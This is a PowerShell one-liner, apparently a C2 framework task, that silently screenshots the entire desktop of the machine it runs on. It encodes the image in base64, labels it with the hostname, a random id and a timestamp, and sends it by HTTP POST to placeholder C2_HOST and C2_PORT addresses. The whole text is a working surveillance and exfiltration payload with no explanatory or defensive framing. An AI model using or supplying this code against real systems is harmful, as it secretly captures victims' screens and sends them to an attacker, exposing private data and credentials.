$hn = (Get-Random -Minimum 100000 -Maximum 999999); $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"; $hostname = $env:COMPUTERNAME; $filename = "${hostname}_${hn}_${timestamp}_screenshot.png"; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.Left, [System.Windows.Forms.SystemInformation]::VirtualScreen.Top, 0, 0, $bmp.Size); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $img = [Convert]::ToBase64String($ms.ToArray()); $body = @{ image = $img; filename = $filename } | ConvertTo-Json -Compress; Invoke-RestMethod -Uri "http://{C2_HOST}:{C2_PORT}/screenshot/$hn" -Method POST -Body $body -ContentType "application/json"